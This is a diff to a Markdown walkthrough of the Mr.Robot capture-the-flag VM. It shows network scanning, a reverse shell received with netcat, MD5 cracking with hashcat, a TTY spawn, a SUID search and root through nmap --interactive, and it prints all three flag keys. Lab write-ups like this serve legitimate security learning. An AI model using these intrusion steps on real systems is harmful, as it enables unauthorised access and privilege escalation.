@@ -23,13 +23,13 @@ If you want to learn more about the proper procedures and steps then I suggest y
 
 Since the **Mr.Robot** VM is being hosted on my PC using a **Bridged Adapter** over VirtualBox, we will go ahead and scan our network to see if we can’t get the IP. To do so, type in **netdiscover** in your terminal.
 
-```sudo netdiscover
+```
 sudo netdiscover
 ```
 ![screenshot](images/1.jpg)
 The IP of 192.168.0.103 will be our target. Once we got that, let’s go ahead and run an nmap scan to check for any open ports and probe for running services.
 
-```nmap -sS -T4 192.168.0.103
+```
 nmap -sS -T4 192.168.0.103
 ```
 
@@ -37,7 +37,7 @@ nmap -sS -T4 192.168.0.103
 
 After running a quick command on nmap, I see ports 22, 80, and 443 are open. Okay, since we know this is a web server… let’s run nikto to scan for any “possible” vulnerabilities or misconfigurations.
 
-```nikto -h 192.168.0.103
+```
 nikto -h 192.168.0.103
 ```
 ![schreenshot](images/3.png)
@@ -70,7 +70,7 @@ Nice! We got 2 locations we can navigate to fsocity.dic and key-1-of-3.txt. Of c
 ![screenshot](images/7.jpg)
 
 **Key 1 :**
-```073403c8a58a1f80d943455fb30724b9
+```
 073403c8a58a1f80d943455fb30724b9
 ```
 Yay! We got the fist key! Let’s keep moving on… It ain’t over yet, ain’t over yet! Move, keep walkin’ until the mornin’ comes! (Sorry, got carried away again.)
@@ -122,7 +122,7 @@ After downloading, don't forget to configure the shell a little, then upload it 
 
 After the upload is successful, run netcat and navigate the browser to the URL of the file that has been successfully uploaded.
 
-```netcat -lnvp 4444
+```
 netcat -lnvp 444
 ```
 
@@ -135,11 +135,11 @@ Awesome! We got the shell up and running on the host! Let’s snoop around to se
 Okay, I found the second key, but I don't have permission to view the text, and it looks like we have an MD5 hash of the bot's username. Let's use Hashcat and see if it can crack the MD5 hash for us.
 Copy the hash key and create an .md5 file to use as the hash. You can follow the instructions I used, or use any other command you like.
 
-```echo "c3fcd3d76192e4007dfb496cca67e13b" | tee password.md5
+```
 echo "c3fcd3d76192e4007dfb496cca67e13b" | tee password.md5
 ```
 
-```hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o crack.txt
+```
 hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o crack.txt
 ```
 ![screenshot](images/15.png)
@@ -150,7 +150,7 @@ Since we have the password and the session on the host, let's see if we can log 
 
 Okay, we got shell! Now we want to be able to login to robot. So what we need to do is establish a TTY Shell. We can do so by typing the following line:
 
-```python -c 'import pty;pty.spawn("/bin/sh")'
+```
 python -c 'import pty;pty.spawn("/bin/sh")'
 ```
 
@@ -160,7 +160,7 @@ Once in, we can login as robot and get the second flag!
 ![screenshot](images/16.png)
 
 **Key 2 :**
-```key 2 :
+```
 822c73956184f694993bede3eb39f959
 ```
 
@@ -169,7 +169,7 @@ Since we exploited the host, and got in - our next step is to carry out Post-Exp
 
 next thing i usually do is look for SUID binaries and see what we can exploit to get to the top.
 
-```find / -perm -4000 -type f 2>/dev/null
+```
 find / -perm -4000 -type f 2>/dev/null
 ```
 
@@ -177,12 +177,12 @@ find / -perm -4000 -type f 2>/dev/null
 
 Awesome! The host in running an old version of nmap, which supports an option called “interactive.” With this option, users are able to execute shell commands by using an nmap “shell”.
 
-```nmap --interactive
+```
 nmap --interactive
 ```
 **key 3 :**
 
-```key 3 :
+```
 04787ddef27c3dee1ee161b21670b4e4
 ```
 
